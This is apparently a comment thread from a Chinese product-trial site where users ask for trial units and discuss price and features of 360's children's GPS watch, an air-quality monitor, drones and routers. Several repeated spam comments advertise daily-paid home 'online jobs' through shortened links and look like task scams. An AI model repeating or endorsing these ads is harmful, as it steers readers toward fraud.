忽然有个疑问，产品是可以定位，但如果孩子自己把表摘了或者真的被坏人拐跑了，又把手表扔了呢？觉得应该在表带上加一个指纹识别码或者密码之类的，保证孩子和手表的一体性。
期待完整的报告，也可以学习一下检测空气质量的方法！
什么时候才能买到撒
不错，但好像没有电视上说的那么逼真哦！
好有爱，有这个应该很方便呢。
哇。太神奇了吧/这个东西都能有////。。。好想要一个
有点像小说里的网游
\有个这个我也可以种活花草皮了？
支持，看上起很不错的样子
应该弄个绿叶造型
看着挺好的
哇，我想要。这么适合我这种懒人了，早上洗了衣服晚上才去拿出来。 
我有个疑问 这个产品在孩子剧烈运动的时候电力能撑多久？
好希望能够申请成功啊，希望有自己呀，能让孩子的安全做保障 
非常期待啊 
木木 我看上你了 你真漂亮
产品很需要，希望能有一个。。。
试用中不了签，尽快上市，我第一时间买，无条件的。。。
真的感兴趣，暂时还的看看买过人的评论
呵呵                           是
为孩子加油,期待中!
同问啥时候开放购买啊，试用没成功，我想买个给我小侄女。
专业客观测评，全面指标评析，图文详尽描述，清晰一目了然。有迫切实际需求，会客观公正评论，给我使用机会吧，你会得到更好的测评结论，更好的推广。
专业客观测评，全面指标评析，图文详尽描述，清晰一目了然。有迫切实际需求，会客观公正评论，给我使用机会吧，你会得到更好的测评结论，更好的推广。
专业客观测评，全面指标评析，图文详尽描述，清晰一目了然。有迫切实际需求，会客观公正评论，给我使用机会吧，你会得到更好的测评结论，更好的推广。
期待啊。什么时候出？
希望能中一个给孩子用
超出范围就不能定位有什么用呢？
太想要一个了，什么时候上市呢？
还没有孩子，还是不要了，期待评测结果
很好用呀。。。
宝贝四岁了，天生爱动的他现在可会乱跑了，逛街时候时刻都要看着他，生怕一步留神就不见了。今天偶然看到如此高科技神物，迫不及待的来申请一下，期待好运能够降临哦！
这个可以有，赶紧出吧，
外观像熨斗
不懂就不要装懂，并不是2G运行内存就比1G快，8核就比4核运算快， 打个比方款式一模一样的单车车架还分铁 铝 碳等。。同样的材质也分等级，被小米洗脑了的还不少。。。。
孩子很想要，我也像看看360到底有多给力
太帅了。好想看看实飞的效果啊。
很帅的产品。还登陆过奇酷试用哦。
爱好飞行，超级喜欢撒，就是不知价格....银子应该少不了，如果有试用就爽歪歪了
希望能快点出来，我已经等了一年多了！
晚了一步，没能申请上，好可惜，希望下次能赶上
申请过了，不知道能不能通过啊~~
又增加了50个，希望我可以获得这个试用机会啊
已经有点“刀剑神域”中“NERvGear”的模子了
显示其他用电设备的用电量
看着怪刁，不知道好不好用……
而且还可以隐秘偷拍。（嘘......）  这个不用说出来啊 大家都知道的。说出来感觉360很猥琐呢还影响360形象
会不会很贵啊？        我经常丢饭卡，有了它就可以避免了
额 ide期待！！！看好360的创意
儿子很想要，真心期待能通过啊~
都是为了孩子啊！
我家三周的宝宝刚上幼儿园，很期待啊
我儿子三周半  即将上幼儿园  特备期待
个人觉得蓝牙4.0的硬件要求有些高。为什么不用NFC或WIFI信号？
支持奇酷,越搞越好 
一直支持......
智键很方便，而且质量也很好
很新颖的产品，期待中···
太方便了！赞 
最近都是很不错的试用产品哦，虽然没中，但一如既往支持！
神一般的存在
hhvbuj
马上就要上小学了，真心需要啊
期待进一步评测！！
一次都没有中过，看来是我人品不行
期待这产品！
360°全方位保护，不是期待，是相当期待
抽中的概率比中500万的概率高多少？
什么时候能上市啊
有需要，期待这么好的产品~
感觉很美观，希望使用效果更好！
空气质量的好与坏，对人体的健康带来极大的影响。如今的环境日趋恶劣，空气污染令人堪忧！如果这款产品能够有效地，准确地检测出空气中含有的有害物质对人体造成伤害的话，我们应该值得去推广他，希望他能够走进千家万户，让人人都远离污染可以拥有健健康康的生活！如果测试成功，希望可以量产，期待这一天的到来……
期待中希望我可以有好运气
我们家蛋蛋已经走丢过好几次了，360这个手表是真好呀，希望能申请上。
30儿童卫士好酷啊，真心想拥有呢，快点上市吧！
读书的学生没办法买啊！！！
根本抢不到 为什么要用抢购的方式  其他方式不行啊？？？10点钟 晚上20点不行吗？？？
孩子就是妈妈爸爸爷爷奶奶的命！
不抢购不行啊！！！
太贵了太了  都不能单独打电话 还有和手机一起用
7月10号有货  售价1599 
7月10号才有货  售价1599
我家孩子很皮，带她去玩，几乎每次都会走丢
YES（：-：）
女儿很想要
卖肾都买不起，而且不是很成熟
造型不重要 功能很好   虽然一直没中  但还是一如既往的支持
支持，看上起很不错的样子  
支持奇酷,越搞越好 
应该弄个绿叶造型 
真是好东西，效果好的话推广会很快。
回头让奇酷来个产品演示视频哈哈
据说两千多，在国内售价算比较低的，国外动辄要七八千呢
据说两千多 国外动辄要七八千呢..
据说两千多 国外动辄要七八千呢...
哈哈 那个是亚马逊的无人机吧
奇酷加油！！越做越好
奇酷加油 越做越好！！
这个和空气净化器在一起绝配呀..
这个看起来好酷的样子！！
小孩准备上小学了，的确需要这款神器！父母可以安心点。
确实好专业好详尽啊！
确实写的好专业好详尽~~~
应该不会这么贵吧。
应该不会这么贵吧。
应该不会这么贵吧？
应该不会这么贵。
很好 很好！
henhao  hen hao
很好 很好！
这次的外观设计我觉得没有上次的炫，个人意见，不喜勿喷。
时间显示有点不够高端，特别像2元一个的那种电子表。真的！不是我不喜欢360儿童卫士，是真心觉得这次设计不太好！
感觉是中国的糖画的现代版！
只求便宜点，也让我们体验一下高科技智能飞机机器人。快点出场吧。。。。我要免费申请到。。。。
精准度是一个大的问题吧
希望土豪送我一个。
这样能减肥？
真的是很多年前就有了
我表示买不起。土豪送我一个吧
好东西值得拥有！
宝宝马上就要过生日了，希望能中一台。
很喜欢，从外观到设计理念都不错
只求便宜点，也让我们体验一下高科技智能飞机机器人。快点出场吧。。。。我要免费申请到。。。。 
只求便宜点，也让我们体验一下高科技智能飞机机器人。快点出场吧。。。。我要免费申请到。。。。 
123123123123123
123123123123123
 只求便宜点，也让我们体验一下高科技智能飞机机器人。快点出场吧。。。。我要免费申请到。。。。 
买智键是包邮吗？
没电了怎么办
上次没个女儿买生日礼物，希望这次能被选上
我好想要个呀
现在儿童安全是个大问题
只求便宜点，也让我们体验一下高科技智能飞机机器人。快点出场吧。。。。我要免费申请到。。。。  
这是我的61礼物,希望可以有.
重新定义飞行 很给力～
期待中，很喜欢。
人家是大男人，你不懂就别乱说！
我想知道，奇酷网上的这些稀奇东西，在哪里可以买到？ 等试用装太麻烦了。 如果价位可以接受的话，我想买来用。 有专门的购物网站么？
赞，大赞！！！
希望。早点开发出来
这是我们孩子的隐私，这样是违法的打到360
想买，但是太贵了，还是不买了。
定位就算了还听声音
这个是相当好呀，出来以后必须买，比在X宝买些不知道牌子或是信不得的产品强大太多啦
感觉减肥效果不大啊
在国内，这类产品价格是王道，价格太高市场就做不大。
价格略高啊，一般人消费不起
不小心想到的事情是不是也会做出来呢？感觉没有自己控制大脑行为来的方便啊。
看着应该挺实用，空气概况可以通过观察灯光和手机就可以知道了，但是个人感觉造型不是很大方，不知道占不占地。另一方面它是否是节能型的机器，如果是这样的就更好了。
好喜欢，就是太贵了。
想问下设计者，这台机器的最大荷载时多重？
家里有一个小弟弟，希望可以中，就可以给弟弟更好的生活环境
太贵了，买不起呢。努力赚钱
给自己的小孩佩戴儿童卫士，父母图个安心。
同求试用！
关注健康，过有品质的生活，期望有你e-air，感谢奇酷
最近正在装修新家，快完工了，家有两个孩子，新房的气味怕对孩子不好，还是放放住着才放心！！！
这两天把前年买的表戴在手上，先感觉一下哈！等的心急啊！六一能不能有发布啊？！
智键很好用，很方便
智能时代发展太快了，只有想不到，没有做不到啊！好东西是不容错过的！
赞！好想拥有一个
能够飞多远啊！
别告诉我直接能飞出一个省，那可不得了啊！
做梦都想要    快出试用吧   orz
这不算创新，简直是抢劫
颜色不重要，质量怎么样，怎么不用夜光的材料
太酷了，努力奋斗
好久开始第二次预约啊
多少钱啊，怎么买
中国的吗madeinchina? 
希望能中啊 
儿童有什么隐私那，再说了就算你的隐私泄露了，也是泄漏给父母了，让父母更加了解你。这有助有你和你的父母的关系.你在外边有危险你能在第一时间内让父母知道你的位置和你的危险程度
马上有一对！！！
应该不是只能充iphone5吧
看起来挺轻巧的~而且很漂亮
有点像《刀剑神域》 
新产品，高创意，好东东。
正在装修房子，虽说尽可能选择环保标识的装修材料，但亦担心新家装房子的空气质量问题！尤其家中还有孩子和老人，所以对家装后的空气质量问题尤为担心啊！
哈哈哈！好适合我！期待呢！
这个创意不错
缺陷是体型较大，不方便隐藏，以及和飞行速度，续航系统。
快六一儿童节了，希望奇酷官方方面快一点，我还是希望给孩子一个节日的礼物惊喜。实在不行的话，好歹也公开发售让大家伙自己买。
55555555如果我可以中到的话就好了5555555555555我好想呀::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::::&gt;_&lt;::
没有能即使视频略有失望
各位大佬，你们都错了，智能家电、智能家具不等于智能家居。要正确理解这个产业，应该首先去这个网站普及一下：www.i-tone.cn，告诉你什么是真正的智能家居
适合小件物品，大件东西估计要推出大号才可以了吧，
我的方案成功预测  增加电子表功能，基站功能！   
设想、实用化和市场定位及市场需求是否一致。 
希望可以联网对战
希望能自定义~~
需多少钱???
等待好喜欢，
这个不能买，有密集恐惧症
儿童节要到了，女儿的礼物是一份惊喜！！！
真希望有一对啊，这样两个人出差的话，也不怕因为要开会不方便打电话了
128 G超过1000元就太贵了。
好贵啊,为什么不能便宜点呢? 
早就关注奇酷网的东西，一直创新是我喜欢他的原因，今天看到这一款空气监测仪，感觉研发团队的目光还是很有远见的，对现在的空气质量越来越不放心的今天，这样一款产品肯定会在现在和未来有一定的市场，很看好，希望申请成功来感受一下来自这样来自“外太空”团队的产品，当然如果审核不过也没事，还是力挺这样的团队！很赞！！！
六一儿童节好想把这份礼物送给我女儿。这是她人生第一次过六一。
没有实际意义
3D打印太高端了，玩不起。
我会中的  绝对 会中
很方便的样子，真希望推出多平台版本。
手机如果被偷，小偷一般会关机。请问关机后，还能发出警报声吗？
虽然这玩意很喜欢，但是太贵了点。
那天10点准时抢，有个屁啊，刷个新有货，结果说个抢购结束，草泥马的京东！只好买其他的路由器了
很棒，期待。
给女儿的礼物
高大上啊，不过还是觉得价格额亲民的话更好。
一开始表现一般，距离5米就没信号了，用了两天后渐入佳境，信号越来越给力，上网速度也快了很多，就是有一点路由检测时总是提示信道不稳定，修复后在检测还是提示不稳定，不知是什莫原因
直接开始销售不就得了，SB周鸿伟
期待中……
果壳路由也有触摸屏，还更好看了
正在装修房子，虽说尽可能选择环保标识的装修材料，但亦担心新家装房子的空气质量问题！尤其家中还有孩子和老人，所以对家装后的空气质量问题尤为担心啊！
其实这个的外观应该改进一下，
希望东西好，价钱也好！
多少钱？？
房子刚装修好，有父母亲和孩子一起生活，以前没有注意过室内空气的质量，就是有PM2.5和涂刷油漆后才注意到室内空气的质量。刚好有这一款产品，发现其功能非常强大，对其开发团队赞一个，呵呵
好赞，就是有点贵！
好赞，多少钱？
好赞，便宜点就买一个！
奇酷好样的，真的很奇特，真的很酷~~~~
好赞，便宜就买一个，大概多少钱？知道的回复。
不知道团队是怎么想出来的？佩服，把手机功能发挥的淋漓尽致
很喜欢，但这太贵了。。
手机操控创意，真心不错。航拍的最佳利器
赞一个，厉害
商学院出来的就是与众不同呀
很好，又便已携带的东西，多少钱？
希望价格不高，东西好
好酷啊！！期待期待！多少钱？
酷爆了！！！多少钱？买买买。
房间怪味很大，听说有一款空气监测仪，我想要，赞一个
期待报告的更新，加油兄弟。
值得注意的是，产品内部的滤网有外包装袋，建议撕掉，以便产品过滤效果（这点官方倒是没提示）。观察的好细致啊。
太赞了！！！！
+10086
我要试用，值得拥有啊！
哇哇!好东西啊
我想了解价格、体积还有充电一次可以用多长时间
能飞多久 飞多远啊？
主要还是价格问题
厉害，必须要赞一个
中啊，中啊，给我中啊，南无阿弥陀佛，阿里路亚，阿门................
这个绝对要有，以后查色就不用那么蛋疼找色卡
dddddddd
宝宝9个月了，正在快速成长阶段，但河北的空气质量太不给力了，迫切希望能够申请成功，给包包一个健康的环境，产品介绍看过后，觉得真的太棒了，So决定试用一个，希望能够成功！
招淘宝傔职人员，有意者请博客联系我【 http://t.cn/8sfyr3p】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
招淘宝傔职人员，有意者请 博客联系我【 http://t.cn/8sfyr3p】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
距离咋样？
这不就是四轴飞行器吗
好像很好用的样子
真的有用吗？ 
看着功能挺强大的，不知道价格怎样，能飞5分钟吗
如果這個球能洗乾淨衣服，以後寶寶的衣服就不需要另外買臺洗衣機了～
这价，伤不起呀
比較關注會不會長蟲子
刚装修好房子。虽说尽买的环保材料，但心里没底。非常希望有仪器能检测。e-Air空气检测仪不仅让家里空气质量看得见，还能自动优化和改善环境。太好了！我代表全国人民表示感谢！迫切希望能够申请成功！
太高端了，好期待这个东西
USB 3.0才是王道啊，，32G才够用啊
保佑我中啊啊   啊啊 啊啊啊 啊啊啊啊
现在天天雾霾,家中上有老下有下小.天天PM2.5爆表,太可怕.最可怕的是不知道自己所处的环境是什么情况!看了这个产品的介绍后我眼前一亮,太棒了.如果真象介绍里说了那样,别说是试用了,就是自己花钱也会买一个的.但试用的好,肯定会向朋友推荐的.
儿童节是肯定赶不到了，盼望早日正常发售!
不错 不知道要多少钱？
市区的房子正在装修中，今天上午发现了这款e-Air 空气检测仪 神器，鉴于装修有可能带来的甲醛等有害气体，迫切的想用它来检测一下装修后房子的空气质量。如果好用定会向朋友推荐！
刚装修好房子。用甲醛试剂盒测试了，但心里没底。非常希望有仪器能检测。e-Air空气检测仪不仅让家里空气质量看得见，还能自动优化和改善环境。太好了！希望能够申请成功！
盼早日发售！！
减肥是很难坚持的，但愿这个产品能让我在玩游戏的过程中不知不觉的就减肥了，哈哈！
苹果电脑质量很好，就是太傲慢了，不太亲民！这个东西的出现有点敲诈勒索的味道！但总比没有好！
奇酷网真是强大啊！！！期待！！！
真心期盼能试用，更盼着能早日发售啊！
小米3配置高....玩天天酷跑丢帧严重。。。。不能只看配置
家里明天都有好多灰尘 ， 非常想测试一下空气， 这款多功能空气检测仪正是我想要的，但愿能申请成功
期待值得拥有的东东！！！
空气净化功能，加湿器功能和恒温功能是合成到这个机器的吗？还是模块化的需要组装
希望早日发放，但愿我能成为试用中的一员.....
价格要能让咱们老百姓用得起！
第五张没有亮点 第三张有亮点
可以成为试用中的一员吗？
头一次见识到手机套还有这个创意，真的很好，没有做不到，只有想不到！
期待  出了铁定买 但能不能支持MYO Arm band手臂环控制器
看微博误打误撞进来的，试用的东西都很新鲜啊，这款东西更是，介绍详细些就更好了
真的有用吗？
值得注意的是，产品内部的滤网有外包装袋，建议撕掉，以便产品过滤效果（这点官方倒是没提示）。  在机器的插头的包装袋会有提示的标签哦！可能没注意看吧！标签写明通电前拿去滤网的袋子的！
不知道近视的话会怎么样？要戴眼镜吗？
看到这款产品感到很新奇  特别感兴趣
正中家长下怀。亲民是一个产品永远的道
家里刚装修好，特别想知道家里的空气质量如何？期待中。。。
有网也是耽误的事 
等待中大奖
好神奇的宝贝，我想通过我这里的试用，会让这款人人关心而且需要的产品知名一地，造福四方！
什么时候出啊？别只出苹果和安卓系统啊  window系统也是很有市场的啊。有实时图传吗？赶紧出啊？迫不及待了有木有？
期待试用，现在的空气实在令人担忧，不过我的手机信息填写有误，是安卓版的，不会影响审核吧
外出带着应该很方便
已经买了啦，真心的好用，已经向身边的朋友推荐了！
哇，太好了吧
希望筛选到给儿子当六一的礼物
  很棒的设计
好神奇的宝贝，我想通过我这里的试用，会让这款人人关心而且需要的产品知名一地，造福四方
好东西，很棒！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解 
做的真的像网游小说一样的话10000-20000我感觉大家都能接受，加入就是一个液晶屏幕挂在眼前500也贵
这比智键酷多了。
要是像刀剑神域那种感觉，就算几十万我也要凑钱买，要只是个显示器挂在眼前100块钱我都不买
恭喜  真希望自己也能抽到、
未来干洗发展新趋势？好高大尚德感觉
这个创意不高啊 早都有了 就是WIFI 或者蓝牙什么的加个程序 控制 无聊
是国产的么。。
这，好强大的车载无线WIFI发射器。
我真心喜欢它，好漂亮
不错哦！360够给力！
好神奇的宝贝，我想通过我这里的试用，会让这款人人关心而且需要的产品知名一地，造福四方 
哼，遥控距离过关再说吧 
六一要来了。上帝给我一只表吧
在好的东西只能看，买不到多难受啊 
在那里有卖a 
真心需要，
六一要来了,给我一只360儿童卫士吧 !!!!!!!!!!!!!!!!!!!!
期待使用。。。
看起来很小巧的！不知道存储功能怎样！如果外出旅游和游玩携带式很方便的！
神奇的新产品，神奇的作用，我想通过我的试用来看到它神奇的效果，让我们这些正在为空气质量而苦恼的人们真正摆脱苦恼而放下苦恼，愿我们神奇的产品能够真正造福百姓。
6.1是我生日，希望得到360儿童卫士手表！
图片没有照到还是怎么样呢，这个小相机怎么携带或者和物品怎么连接呢！
如果就是变换颜色的话，没什么新奇的啊！
想给儿子买一个···又不知道什么时候出来··有试用也来试试运气
神奇的新产品，我想通过我的试用来看到它神奇的效果，让我们这些正在为空气质量而苦恼的人们真正摆脱苦恼，愿我们神奇的产品能够真正造福百姓。 
我是一个6岁小孩的父亲，小孩即将上小学一年级，放学没有人接送，希望申请一个
我用了一下觉得这个效果真的不如广告说的，无法穿墙，我在想广告上说的穿墙王是不是我买的运气差所以信号不好啊，隔一堵墙信号就衰弱两格，没有我的两个头的水星路由好
我不需要覆盖几百米，我只要能覆盖150平方米，能穿3道墙，如果有一项不达标我能退货吗。我从09:59开始刷新，根本就没有，时间刚到就是卖光了。可能吗，这次只是求关注罢了，而且差评不少。
为什么 不进行出售  都是试用的
好期待，每天都上来看看
什么时候上市呀
保佑我中阿，就当做我的6.1儿童节的礼物吧！！！！ 保佑保佑保佑保佑保佑保佑我啊！！！！！！！！！ 一定要中啊！！！！！！！！！！！！！！！！！！
就是NFC芯片,交通卡里的NFC,食堂飯卡的NFC,上下班門禁卡的NFC,懂你沒 親們
除了耗電,其他都是很實用的~
这应该是个好东西
这玩意足够酷，酷的东西我都喜欢，希望能中把阿门
申请了这么多期，这次是最认真的，希望审核通过。
不錯  很好的 一個創意 
烧香拜佛，希望能给女儿申请到一个。
藍牙啊 大爺
刚换得新办公室，虽然做了除甲醛处理，每天早上一开门还是有异味，不知道是不是有大量残留甲醛。真心希望能中奖，给我们办公室做个测试，发现问题及时处理。
第二次申请吧，希望能给女儿申请到一个。
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受
我的女儿已经上学了，有时因为工作不能去接她。最近小孩的安全越来越不能保障，有了这款手表，才肯放心啊。恳求亲爱的工作人员，让我的女儿得到一份安全的保障吧。
希望能给儿子申请到一个
用来控制吸烟量？贵了吧！
申请试试看运气了，宝宝现在一岁半
怎么感觉不靠谱
期待中,支持奇酷
写的非常不错....
好玩，就是贵
希望能给儿子申请一个 
怎么申请不了了
居然有这么神奇的东西，期待使用！！！！！！！！！！！！！！！！ 
期待能够选中我！！！！！
不可着急，以前旧件换新。
还要钱？给我得了
坐等咱国山寨 那时候价格一定很低吧
希望选中呵呵呵呵
无人机呀。。。
只希望价格能平民化。
价格便宜就是硬道理。
我的工作就需要确定风速~不是绝大多数人会觉得这个有用~但是包括我在内的一些人绝对觉得这个很有用！
误操作严重坑爹，被我直接丢了
遥控距离不好控制吧 外形虽然美观 但是实用么？价格定位在多少？
360的产品 凭心而论 确实在跟着社会需求走 希望你们创新不断 有困难找360
什么时候开始开卖啊？原本以为六一前可以买一个送给宝贝的
女士骑这个不错，比那种大的电动车要轻便些，适合让我们这种人小力气 小的人
希望我能中，小孩      来深圳了，正缺呢
我是宅男，大把时间玩这个
操作控制怎么样？遥控距离呢?
又是个费电的啊。。
强大的车载无线WIFI发射器，要贫民化哦
好玩多少钱？
啥时候我才能拥有“你” o(︶︿︶)o 唉
遥控距离多少，价格多少？能实时看到航拍的映像不？航拍的分辨率多少？
比起你的试用我更想直接购买
6999,淘宝上有了，不过好像没有卖出几个，太贵了 
哇，魅族的不错 
价格低一点，上学可以用 
多少money
不过一个U盘，干嘛这么贵？总有一天，苹果会像白菜一样的，我发誓。
好，就是有点贵。
有这么神奇的东西，期待使用！支持奇酷 ！
希望我能被选中。
想买一个。
给力，加油
看起来不错，但是配置呢？
好东西哦，我喜欢，
感觉还是不错的吧，什么时候出
有这么神奇的东西，期待使用！支持奇酷 ！ 
不错正好我人在哈尔滨，老公在福建，坐等~~
快六一儿童节了，把360儿童卫士送给孩子是最好的礼物吗，比送给孩子什么都强
孩子的安全比什么都重要
快要六一儿童节了把360儿童卫士送给孩子是最好的礼物，比送给孩子什么都强都有用。祝天下的孩子学习进步，在360儿童卫士的保护下安安全全的度过每一天
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受  
支持奇酷 ！有这么神奇的东西，期待使用！
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受 ！ 
有这么神奇的东西，期待使用！
有这么神奇的东西，期待使用！
有这么神奇的东西，期待使用！
有这么神奇的东西，期待使用！
有这么神奇的东西，期待使用！
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受 ！
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受 ！
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受 ！
小说中的神器么？希望到时候有试用的机会~卖价不要太高
貌似很不错的样子~看着很喜欢~好想试试哦~
买一个去轰炸美军基地可以吗
期待使用，很想体会一下新产品的性能和特色，感受一下高科技带来的不一样的感受 ！   
是个好东西，希望也能有个好价格
感觉好爽.科技改变生活
期待......
小孩在上学，由于我们都是工薪簇，上下学都是小孩自己程车，多少有些担心却又无奈，如果能试用360儿童卫士，我们做家长的也会安心些，支持该产品能够大量上市。
看起来不错，就是不知道价格能否亲民。
还没用过呢，希望这一次能通过申请，
不知道价值几何？
我们在等待！！！！！！！！！！！！
但愿能中呀 
我们在等待！！！！！！！！！！！！ 
期待申请成功，好给来个好评。
好！！！！！！
第一次参与这样的活动，希望感受一次高科技
焦心的等待
很期待新产品，这样就可以时刻关注空气质量了。
该飞行器除了摄像能否开发一点其他功能呢，比如除尘、驱蚊虫、额  或则遛狗？
很想。。。。
很期待。看看农村的空气质量如何。
有点贵，有点贵
好东西啊  有了可以和孩子DRY做玩具了  不过应该好贵吧
哇咔咔，带感啊。有木有试用的。。。
好期待试用名额呀，希望有自己
价格一方面，差不多价还不如买个好的。配置实用才好
都好几期了，怎么一直都是审核中。。。好希望可以试用
上一次的活动没被选中，希望这次能用上，我家小孩太需要这手表了
期待啊，好像在六一得到360送给孩子的特殊礼物——安全啊。
原来是27号，现在又改成了30号，以后还改日期不？
好产品值得期待，希望及时不用也能有优先购买的资格。
奇酷能给优先购买的资格吗？
这个不错啊
城市里的空气质量真的是要好好关注，每次从国外回来的人总会小感冒不断，希望能从自己小家庭开始改善
为什么搞好几个拍照功能？ 
外观很清闲可人，真想实际用一用，感受一下科技的魅力！期待着。。。
希望可以很快上市！！！！
什么事有。多钱。配合什么设备。我想拥有
第一次评论，试用一下看看
儿童卫士第一代的产品为什么也买不到呢？好想先用起来！
这种随身携带摄像头国内也有，价格很便宜，不过核心问题都是电量和连续拍摄，因为没有屏幕不能实时查看所有经常会出现摄像头自身已经停拍或者根本就没有启动，而拍摄者根本不知道，希望这款摄像头不会出现这种问题。价格有些贵了。
希望能抽中
用途和价格相比优点鸡肋了，起码在国内的消费水平中是这样。
什么时间才能购买呀，什么时间才能有货呀！ 
期待啊。能有试用的资格的话很荣幸。
嘎嘎，这东西不错
怎么不出3.0的，快呀，usb2.02的有点慢吧
第一次参与这样的活动，希望感受一次高科技 
东西还可以，就是人长得不怎么样。
从一代就试用没选到，希望二代能够选上，感觉360的东西不错，这手表很实用。
看起来不错，不知道价位是多少。。。。？
第一次听说过这个产品，期待获奖
在新疆这样的东东就几乎无用之地啊，需要改进
很需要这种产品
好东西用了才知道
光能检测有啥用啊？
要是能选上就好了
想知道价格
高端大气上档次
耐心的等  好产品
给个机会吧！
这个会自动喷洒农药之类的么？要不小飞虫很讨厌的
什么时候轮到我呀
有iphone5c的吗？ 
就是哇我自己要的没有问我妈嘻嘻
真的希望给给宝贝赢得一个。
什么时候可以买？好想买一个
希望能申请到，做父母可以安心一点
跪求中，希望能成全
现在设备彻底牺牲了，直接无法充电了。。。充24小时都开不了机。。。。太垃圾了 
好想能申请一个，可以给小女一个惊喜也能帮你们做做宣全
期待六一，有好消息
很希望能申请一个  不知道有没有机会
期待！！！！！！！！！！！！！！
非常的期待
咱普通人也能不普通的礼物给孩子，多棒！
me too
价格还可以在低一些
介绍太少    这东西还不错的   无线路由的思路
中国人我们可以山寨的比它更好，这算什么！
啥时候正式开卖？？？？申请是希望不大。。。。我周围至少10来家人都要买来着。。。。赶紧出来。。 这两天又看到小孩儿被偷的新闻。。。。。。。
尽快出来，想给孩子买个。希望稳定、健康、定位准确、功能方便，还希望增加远程选择填写内容来提醒孩子。
太酷了 这个得多少钱能买到
我是来看看的
天天关注，非常期待能被选上试用。
期待中，如果好用要赶紧批量生产啊。
最好能防水。。。。早点开卖。。。。
从孩子读幼儿园开始就必须要用到了的感觉
非常期待！
关键是距离
天天关注，非常期待能被选上试用。 
没有实际意义，感觉就是一支热融枪而已。
看介绍，非常的智能化，处处体现科技和人的好美结合，非常想试用一下，家里现在用的日立和松下的，但体积都比较大，性能化也不如BroadLink e-Air，希望能试用成功，感受一下这高科技人性化的产品！
希望尽快上市！！！
听说360的安全手表，想送给孩子。希望产品稳定、健康、定位准确、功能方便，增加提醒功能来提醒孩子那是最好的。 
东西是好，但是4G普及还要一段时间
哪里可以买到？
上次出差失去机会了，现在很想试一试，好期待哦。
非常的智能化，处处体现科技和人的好美结合，非常想试用一下。希望能试用成功，感受一下这高科技人性化的产品！  
都申请这门久了，咋连反应都没有哦
不错，便宜好用的话可以买个
貌似很不错，期待ing，希望价格能够合理。
这个不能算酷品，赶紧撤了
常开nfc，手机的电量吃不消啊
哪里有卖的？想直接买一个。
你这里说试用，网店都有人开始预售７月份出货啦！真的是“提前露一露提高知明度”？自己试好就快出了吧，等着你出售！女儿９月读小学了！
这个不能够太小了吧，如果有个二三级的风怎么办
关键是飞行时间和寿命
小孩子能带吗？这样的话 就能随时随地知道小孩在那了！
戴眼镜的怎么玩呢 这个用户群应该很大
没有镜头，也不可调焦距，
申请中，孩子今年3年级希望能被选中试用
嫌慢买固态
很期待呀，但是为什么第一次申请的时候说22号公布名单，可是22打开看，又显示27号公布名单，今天打开看又是30号公布名单，到底是怎么一回事呢？
我就想知道，说了这么几个月了，到底啥时候能开卖
智能猫眼。
好期待哦，智能家居时代到了
赞 好想买！！！！！！！！
@Qikoo  非常支持！这个如果推广开来以后将是一个新的游戏大陆；
期待啊。。什么时候开售啊。。急啊。。
好东西，期待ing······
123信息网  123xxw.com  免费发布信息进行产品宣传
[给力][给力]给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
[给力][给力]给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～有意者博客联系我  http://t.cn/8sfyr3p
不错 多少钱呢
好东西，顶起来
非常的智能化，处处体现科技和人的好美结合，非常想试用一下。希望能试用成功，感受一下这高科技人性化的产品！ 
家里正在装修非常想使用这款空气质量检测仪检测甲醛是否超标
不错的创意，期待产品上市
看着不错，不知道会卖多少钱
有电子表功能，或摄像头
期待...
之前买的漫步城市的GPS手表，定位差哪去都不知道了，试试360的吧。
期待，期待
很棒 求购
加油360，和喜欢支持你的东西
加油360，和喜欢支持你的东西 
期待...
网络差事网络差事网络差事网络差事网络差事网络差事网络差事
超期待360手表
期待啊!!
有意者有意者有意者有意者有意者
网 络 差事
网 络 差事 
网 络 差事 
网 络 差事网 络 差事网 络 差事
